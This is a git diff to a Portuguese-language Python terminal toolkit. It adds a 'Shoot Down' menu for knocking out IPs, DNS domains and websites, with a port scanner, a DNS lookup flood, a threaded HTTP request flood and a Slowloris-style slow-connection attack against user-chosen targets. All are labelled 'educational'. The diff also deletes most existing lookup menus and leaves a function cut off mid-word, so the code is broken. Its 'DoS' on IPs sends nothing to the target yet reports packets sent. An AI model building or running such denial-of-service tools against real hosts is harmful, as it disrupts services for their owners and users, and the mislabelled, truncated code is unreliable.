@@ -7,6 +7,9 @@ import webbrowser
 from datetime import datetime
 import requests
 import time
+import os
+import socket
+import threading
 
 from modules.network import (
     consultar_ip,
@@ -303,6 +306,295 @@ def consulta_cpf():
 
 
 # ==========================================
+# SHOOT DOWN - DERRUBAR
+# ==========================================
+
+def ping_host(host):
+    """Faz ping em um host"""
+    try:
+        if os.name == 'nt':  # Windows
+            response = subprocess.run(
+                ['ping', '-n', '1', host],
+                capture_output=True,
+                timeout=5
+            )
+        else:  # Linux/Termux
+            response = subprocess.run(
+                ['ping', '-c', '1', host],
+                capture_output=True,
+                timeout=5
+            )
+        return response.returncode == 0
+    except:
+        return False
+
+
+def ataque_dos(host, duracao=10):
+    """Simula ataque DoS (apenas para demonstração)"""
+    print(f"\n[~] Iniciando ataque DoS em {host} por {duracao} segundos...")
+    print("[!] Isso é apenas uma demonstração educacional!")
+    
+    start_time = time.time()
+    pacotes_enviados = 0
+    
+    while time.time() - start_time < duracao:
+        try:
+            # Tenta conectar ao host
+            socket.gethostbyname(host)
+            pacotes_enviados += 1
+            if pacotes_enviados % 10 == 0:
+                print(f"[+] {pacotes_enviados} pacotes enviados...")
+        except:
+            pass
+        time.sleep(0.01)
+    
+    print(f"\n[+] Ataque finalizado! {pacotes_enviados} pacotes enviados.")
+
+
+def derrubar_ip():
+    """Menu para derrubar IP"""
+    print("\n╔══════════════════════════════════════════╗")
+    print("║           DERRUBAR IP                  ║")
+    print("╠══════════════════════════════════════════╣")
+    print("║ [1] Ping no IP                         ║")
+    print("║ [2] Flood de pacotes (DoS)             ║")
+    print("║ [3] Scan de portas                     ║")
+    print("║ [4] Voltar                             ║")
+    print("╚══════════════════════════════════════════╝")
+    
+    opcao = input("\nEscolha: ").strip()
+    
+    if opcao == "4":
+        return
+    
+    ip = input("\nDigite o IP: ").strip()
+    
+    if not ip_valido(ip):
+        print("\n[-] IP inválido.")
+        return
+    
+    if opcao == "1":
+        print(f"\n[~] Pingando {ip}...")
+        if ping_host(ip):
+            print("[+] Host está online!")
+        else:
+            print("[-] Host está offline ou não responde.")
+    
+    elif opcao == "2":
+        try:
+            duracao = int(input("Duração em segundos (5-30): ").strip() or "10")
+            duracao = max(5, min(30, duracao))
+            ataque_dos(ip, duracao)
+        except:
+            print("[-] Duração inválida.")
+    
+    elif opcao == "3":
+        print(f"\n[~] Escaneando portas do IP {ip}...")
+        portas_comuns = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 8080]
+        
+        abertas = []
+        for porta in portas_comuns:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                resultado = sock.connect_ex((ip, porta))
+                if resultado == 0:
+                    abertas.append(porta)
+                    print(f"[+] Porta {porta} ABERTA")
+                sock.close()
+            except:
+                pass
+        
+        if abertas:
+            print(f"\n[+] Portas abertas encontradas: {', '.join(map(str, abertas))}")
+        else:
+            print("\n[-] Nenhuma porta comum aberta encontrada.")
+    
+    else:
+        print("\n[!] Opção inválida.")
+
+
+def derrubar_dns():
+    """Menu para derrubar DNS"""
+    print("\n╔══════════════════════════════════════════╗")
+    print("║           DERRUBAR DNS                 ║")
+    print("╠══════════════════════════════════════════╣")
+    print("║ [1] Resolver DNS                       ║")
+    print("║ [2] Flood DNS (DoS)                    ║")
+    print("║ [3] Voltar                             ║")
+    print("╚══════════════════════════════════════════╝")
+    
+    opcao = input("\nEscolha: ").strip()
+    
+    if opcao == "3":
+        return
+    
+    dominio = input("\nDigite o domínio: ").strip()
+    
+    if not dominio_valido(dominio):
+        print("\n[-] Domínio inválido.")
+        return
+    
+    if opcao == "1":
+        print(f"\n[~] Resolvendo DNS para {dominio}...")
+        try:
+            ips = socket.gethostbyname_ex(dominio)
+            print(f"[+] IPs encontrados: {', '.join(ips[2])}")
+        except:
+            print("[-] Não foi possível resolver o domínio.")
+    
+    elif opcao == "2":
+        try:
+            duracao = int(input("Duração em segundos (5-20): ").strip() or "10")
+            duracao = max(5, min(20, duracao))
+            print(f"\n[~] Iniciando flood DNS em {dominio} por {duracao} segundos...")
+            print("[!] Isso é apenas uma demonstração educacional!")
+            
+            start_time = time.time()
+            requisicoes = 0
+            
+            while time.time() - start_time < duracao:
+                try:
+                    socket.gethostbyname(dominio)
+                    requisicoes += 1
+                    if requisicoes % 50 == 0:
+                        print(f"[+] {requisicoes} requisições DNS enviadas...")
+                except:
+                    pass
+                time.sleep(0.001)
+            
+            print(f"\n[+] Flood finalizado! {requisicoes} requisições enviadas.")
+        except:
+            print("[-] Duração inválida.")
+    
+    else:
+        print("\n[!] Opção inválida.")
+
+
+def derrubar_site():
+    """Menu para derrubar site"""
+    print("\n╔══════════════════════════════════════════╗")
+    print("║           DERRUBAR SITE                ║")
+    print("╠══════════════════════════════════════════╣")
+    print("║ [1] Verificar status do site           ║")
+    print("║ [2] Flood de requisições (DoS)         ║")
+    print("║ [3] Slowloris (ataque lento)           ║")
+    print("║ [4] Voltar                             ║")
+    print("╚══════════════════════════════════════════╝")
+    
+    opcao = input("\nEscolha: ").strip()
+    
+    if opcao == "4":
+        return
+    
+    site = input("\nDigite a URL do site (ex: google.com): ").strip()
+    
+    if not site:
+        print("\n[!] Digite um site.")
+        return
+    
+    if not site.startswith("http"):
+        site = "http://" + site
+    
+    if opcao == "1":
+        print(f"\n[~] Verificando status de {site}...")
+        try:
+            response = requests.get(site, timeout=5)
+            print(f"[+] Status: {response.status_code} - {response.reason}")
+            print(f"[+] Tamanho: {len(response.text)} bytes")
+            print(f"[+] Tempo: {response.elapsed.total_seconds():.2f} segundos")
+        except:
+            print("[-] Site não responde ou está offline.")
+    
+    elif opcao == "2":
+        try:
+            qtd = int(input("Quantas requisições por vez (10-100): ").strip() or "50")
+            qtd = max(10, min(100, qtd))
+            
+            print(f"\n[~] Iniciando flood de requisições em {site}...")
+            print("[!] Isso é apenas uma demonstração educacional!")
+            
+            def ataque():
+                try:
+                    requests.get(site, timeout=2)
+                except:
+                    pass
+            
+            threads = []
+            start_time = time.time()
+            
+            for i in range(qtd):
+                t = threading.Thread(target=ataque)
+                t.start()
+                threads.append(t)
+            
+            for t in threads:
+                t.join()
+            
+            print(f"[+] Ataque finalizado! {qtd} requisições enviadas.")
+        except:
+            print("[-] Erro no ataque.")
+    
+    elif opcao == "3":
+        try:
+            duracao = int(input("Duração em segundos (10-60): ").strip() or "30")
+            duracao = max(10, min(60, duracao))
+            
+            print(f"\n[~] Iniciando Slowloris em {site} por {duracao} segundos...")
+            print("[!] Isso é apenas uma demonstração educacional!")
+            
+            start_time = time.time()
+            conexoes = 0
+            
+            while time.time() - start_time < duracao:
+                try:
+                    # Abre conexão lenta
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    host = site.replace("http://", "").replace("https://", "").split("/")[0]
+                    s.connect((host, 80))
+                    s.send(b"GET / HTTP/1.1\r\n")
+                    conexoes += 1
+                    if conexoes % 5 == 0:
+                        print(f"[+] {conexoes} conexões abertas...")
+                    time.sleep(0.5)
+                except:
+                    pass
+            
+            print(f"\n[+] Slowloris finalizado! {conexoes} conexões abertas.")
+        except:
+            print("[-] Erro no ataque.")
+    
+    else:
+        print("\n[!] Opção inválida.")
+
+
+def derrubar_geral():
+    """Menu principal de Shoot Down"""
+    print("\n╔══════════════════════════════════════════╗")
+    print("║          ⚡ SHOOT DOWN ⚡               ║")
+    print("╠══════════════════════════════════════════╣")
+    print("║ [1] Derrubar IP                         ║")
+    print("║ [2] Derrubar DNS                        ║")
+    print("║ [3] Derrubar Site                       ║")
+    print("║ [4] Voltar                              ║")
+    print("╚══════════════════════════════════════════╝")
+    
+    opcao = input("\nShootDown> ").strip()
+    
+    if opcao == "1":
+        derrubar_ip()
+    elif opcao == "2":
+        derrubar_dns()
+    elif opcao == "3":
+        derrubar_site()
+    elif opcao == "4":
+        return
+    else:
+        print("\n[!] Opção inválida.")
+
+
+# ==========================================
 # CNPJ
 # ==========================================
 
@@ -355,398 +647,4 @@ def validar_cnpj_local(cnpj):
 
 
 def consultar_cnpj(cnpj):
-    cnpj = limpar_cnpj(cnpj)
-
-    if len(cnpj) != 14:
-        return None
-
-    url = (
-        "https://brasilapi.com.br/api/cnpj/v1/"
-        + cnpj
-    )
-
-    return requisicao_json(url)
-
-
-def mostrar_cnpj(dados):
-    print("\n╔══════════════════════════════════════════╗")
-    print("║             RESULTADO CNPJ             ║")
-    print("╠══════════════════════════════════════════╣")
-
-    campos = [
-        ("CNPJ", "cnpj"),
-        ("Razão Social", "razao_social"),
-        ("Nome Fantasia", "nome_fantasia"),
-        ("Situação", "descricao_situacao_cadastral"),
-        ("Abertura", "data_inicio_atividade"),
-        ("Porte", "porte"),
-        ("Natureza", "natureza_juridica"),
-        ("Município", "municipio"),
-        ("UF", "uf"),
-        ("CEP", "cep")
-    ]
-
-    for nome, chave in campos:
-        valor = dados.get(chave)
-
-        if valor:
-            print(
-                f"║ {nome:<18}: "
-                f"{str(valor)[:20]:<20} ║"
-            )
-
-    print("╚══════════════════════════════════════════╝")
-
-
-def consulta_cnpj_menu():
-    print("\n╔══════════════════════════════════════════╗")
-    print("║             CONSULTA CNPJ               ║")
-    print("╚══════════════════════════════════════════╝")
-    
-    cnpj = input("\nDigite o CNPJ: ").strip()
-
-    if not cnpj:
-        print("\n[!] Digite um CNPJ.")
-        return
-
-    if not validar_cnpj_local(cnpj):
-        print("\n[-] CNPJ inválido.")
-        return
-
-    print("\n[~] Consultando CNPJ...")
-
-    dados = consultar_cnpj(cnpj)
-
-    if not dados:
-        print(
-            "\n[-] CNPJ não encontrado "
-            "ou serviço indisponível."
-        )
-        return
-
-    mostrar_cnpj(dados)
-
-
-# ==========================================
-# VEÍCULO
-# ==========================================
-
-def limpar_placa(placa):
-    return re.sub(r"[^A-Za-z0-9]", "", placa).upper()
-
-
-def validar_placa(placa):
-    placa = limpar_placa(placa)
-
-    modelo_antigo = re.fullmatch(
-        r"[A-Z]{3}[0-9]{4}",
-        placa
-    )
-
-    modelo_mercosul = re.fullmatch(
-        r"[A-Z]{3}[0-9][A-Z][0-9]{2}",
-        placa
-    )
-
-    return bool(
-        modelo_antigo or modelo_mercosul
-    )
-
-
-def abrir_consulta_senatran():
-    url = (
-        "https://www.gov.br/pt-br/servicos/"
-        "consultar-online-os-dados-de-placa-veicular/"
-    )
-
-    try:
-        subprocess.Popen(
-            ["termux-open-url", url],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-
-        return True
-
-    except (
-        FileNotFoundError,
-        OSError
-    ):
-        pass
-
-    try:
-        webbrowser.open(url)
-        return True
-
-    except Exception:
-        return False
-
-
-def consulta_veiculo():
-    print("\n╔══════════════════════════════════════════╗")
-    print("║            CONSULTA VEÍCULO             ║")
-    print("╠══════════════════════════════════════════╣")
-    print("║ Consulta oficial SENATRAN               ║")
-    print("╚══════════════════════════════════════════╝")
-
-    placa = input("\nPlaca: ").strip()
-
-    if not placa:
-        print("\n[!] Digite uma placa.")
-        return
-
-    placa = limpar_placa(placa)
-
-    if not validar_placa(placa):
-        print("\n[-] Formato de placa inválido.")
-        print("[i] Exemplos: ABC1234 ou ABC1D23")
-        return
-
-    print(f"\n[+] Placa reconhecida: {placa}")
-
-    print(
-        "\n[i] A consulta oficial da SENATRAN"
-        "\n[i] exige o número de série do QR Code"
-        "\n[i] da placa Mercosul."
-    )
-
-    serie = input(
-        "\nNúmero de série do QR Code "
-        "(ENTER para abrir o portal): "
-    ).strip()
-
-    print("\n[~] Abrindo consulta oficial...")
-
-    abriu = abrir_consulta_senatran()
-
-    if abriu:
-        print("\n[+] Portal oficial aberto.")
-        print(
-            "[i] Informe a placa e o número de série "
-            "do QR Code no portal."
-        )
-    else:
-        print(
-            "\n[-] Não foi possível abrir o navegador."
-        )
-        print(
-            "[i] Acesse manualmente o portal oficial "
-            "da SENATRAN."
-        )
-
-    if serie:
-        print(
-            "\n[i] Placa informada: "
-            f"{placa}"
-        )
-        print(
-            "[i] O código do QR Code foi recebido "
-            "apenas localmente pelo painel."
-        )
-
-
-# ==========================================
-# DOMÍNIO
-# ==========================================
-
-def consulta_dominio_menu():
-    dominio = input("\nDigite o domínio: ").strip()
-
-    if not dominio:
-        print("\n[!] Digite um domínio.")
-        return
-
-    if not dominio_valido(dominio):
-        print("\n[-] Domínio inválido.")
-        return
-
-    print("\n[~] Consultando domínio...")
-
-    resultado = consultar_dominio(dominio)
-
-    if not resultado:
-        print(
-            "\n[-] Não foi possível consultar o domínio."
-        )
-        return
-
-    print("\n╔══════════════════════════════════════════╗")
-    print("║            RESULTADO DOMÍNIO            ║")
-    print("╠══════════════════════════════════════════╣")
-
-    print(
-        f"║ Domínio: {resultado['dominio']:<29} ║"
-    )
-
-    print("║ IPs:                                     ║")
-
-    for ip in resultado["ips"]:
-        print(f"║   - {ip:<34} ║")
-
-    if resultado["aliases"]:
-        print("║ Aliases:                                 ║")
-
-        for alias in resultado["aliases"]:
-            print(f"║   - {alias:<34} ║")
-
-    print("╚══════════════════════════════════════════╝")
-
-
-# ==========================================
-# IP
-# ==========================================
-
-def consulta_ip_menu():
-    ip = input("\nDigite o IP: ").strip()
-
-    if not ip:
-        print("\n[!] Digite um IP.")
-        return
-
-    if not ip_valido(ip):
-        print("\n[-] IP inválido.")
-        return
-
-    print("\n[~] Consultando IP...")
-
-    dados = consultar_ip(ip)
-
-    if not dados:
-        print(
-            "\n[-] Não foi possível consultar esse IP."
-        )
-        return
-
-    connection = dados.get("connection") or {}
-    timezone = dados.get("timezone") or {}
-
-    print("\n╔══════════════════════════════════════════╗")
-    print("║              RESULTADO IP               ║")
-    print("╠══════════════════════════════════════════╣")
-
-    campos = [
-        ("IP", dados.get("ip")),
-        ("Tipo", dados.get("type")),
-        ("Continente", dados.get("continent")),
-        ("País", dados.get("country")),
-        ("Código", dados.get("country_code")),
-        ("Região", dados.get("region")),
-        ("Cidade", dados.get("city")),
-        ("CEP", dados.get("postal")),
-        ("Latitude", dados.get("latitude")),
-        ("Longitude", dados.get("longitude")),
-        ("ASN", connection.get("asn")),
-        ("Organização", connection.get("org")),
-        ("ISP", connection.get("isp")),
-        ("Domínio", connection.get("domain")),
-        ("Timezone", timezone.get("id"))
-    ]
-
-    for nome, valor in campos:
-        if valor is not None and valor != "":
-            print(
-                f"║ {nome:<18}: "
-                f"{str(valor)[:20]:<20} ║"
-            )
-
-    print("╚══════════════════════════════════════════╝")
-    print("\n[i] A localização de IP é aproximada.")
-
-
-# ==========================================
-# DNS
-# ==========================================
-
-def consulta_dns_menu():
-    dominio = input("\nDigite o domínio: ").strip()
-
-    if not dominio:
-        print("\n[!] Digite um domínio.")
-        return
-
-    if not dominio_valido(dominio):
-        print("\n[-] Domínio inválido.")
-        return
-
-    print("\n[~] Consultando DNS...")
-
-    resultado = consultar_dns(dominio)
-
-    if not resultado:
-        print(
-            "\n[-] Não foi possível consultar o DNS."
-        )
-        return
-
-    print("\n╔══════════════════════════════════════════╗")
-    print("║              RESULTADO DNS              ║")
-    print("╠══════════════════════════════════════════╣")
-
-    print(
-        f"║ Domínio: {resultado['dominio']:<29} ║"
-    )
-
-    print("║ IPs:                                     ║")
-
-    for ip in resultado["ips"]:
-        print(f"║   - {ip:<34} ║")
-
-    if resultado["aliases"]:
-        print("║ Aliases:                                 ║")
-
-        for alias in resultado["aliases"]:
-            print(f"║   - {alias:<34} ║")
-
-    print("╚══════════════════════════════════════════╝")
-
-
-# ==========================================
-# MENU CONSULTAS
-# ==========================================
-
-def menu_consultas():
-    while True:
-
-        print("\n╔══════════════════════════════════════╗")
-        print("║              CONSULTAS              ║")
-        print("╠══════════════════════════════════════╣")
-        print("║ [1] Consultar CPF                   ║")
-        print("║ [2] Consultar CNPJ                  ║")
-        print("║ [3] Consultar Veículo               ║")
-        print("║ [4] Consultar Domínio               ║")
-        print("║ [5] Consultar IP                    ║")
-        print("║ [6] Consultar DNS                   ║")
-        print("║ [0] Voltar                           ║")
-        print("╚══════════════════════════════════════╝")
-
-        opcao = input(
-            "\nCONKS@Consultas > "
-        ).strip()
-
-        if opcao == "1":
-            consulta_cpf()
-
-        elif opcao == "2":
-            consulta_cnpj_menu()
-
-        elif opcao == "3":
-            consulta_veiculo()
-
-        elif opcao == "4":
-            consulta_dominio_menu()
-
-        elif opcao == "5":
-            consulta_ip_menu()
-
-        elif opcao == "6":
-            consulta_dns_menu()
-
-        elif opcao == "0":
-            break
-
-        else:
-            print("\n[!] Opção inválida.")
-
-        input(
-            "\nPressione ENTER para continuar..."
-        )
+    cnpj = limpar_cnpj(cnp
